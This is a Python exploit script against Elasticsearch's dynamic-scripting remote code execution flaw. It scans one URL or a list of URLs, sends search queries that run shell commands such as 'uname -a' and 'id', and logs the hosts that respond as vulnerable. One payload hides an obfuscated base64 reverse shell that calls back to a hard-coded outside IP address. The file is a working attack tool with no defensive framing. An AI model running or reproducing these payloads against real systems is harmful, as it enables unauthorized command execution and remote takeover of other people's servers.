# -*- coding: utf-8 -*-
import requests
from requests import *
import sys
import argparse

headers = {'content-type': 'application/json'}
values = '{"size": 1, "query": {"filtered": {"query": {"match_all": {} } } }, "script_fields": {"results": {"script": "new java.util.Scanner(Runtime.getRuntime().exec(new String[]{ \\"/bin/sh\\", \\"-c\\", \\"uname -a;\\"}).getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"} } }'
values1='{"size": 1,    "query": {      "filtered": {        "query": {          "match_all": {          }        }      }    },    "script_fields": {        "command": {            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"        }    }}'
values2='{"size": 1,    "query": {      "filtered": {        "query": {          "match_all": {          }        }      }    },    "script_fields": {        "command": {            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTcuMTEuMjE1Lzk5NzIgMD4mMQ==}|{base64,-d}|{bash,-i}\").getInputStream()).useDelimiter(\"\\\\A\").next();"        }    }}'
linux_valid = "GNU/Linux"
osx_valid = "Darwin Kernel"

succlog=open('result.txt','a')

def exploit(target):

	url =target + "/_search"
	try:
		r = requests.get(url, data=values, headers=headers, timeout=3)
		if (linux_valid in r.text) or (osx_valid in r.text):
			succlog.write(url+'\n')
	except:
		pass

if __name__=='__main__':
    parser = argparse.ArgumentParser(description='api help')
    parser.add_argument('-u', '--url', help='Please Input a url!', default='')
    parser.add_argument('-f', '--file', help='Please Input a file!', default='')
    args = parser.parse_args()
    url = args.url
    file = args.file
    if url!='':
        exploit(url)
    if file!="":
        f = open(file, 'r+')
        for i in f.readlines():
            url = i.strip()
            exploit(url)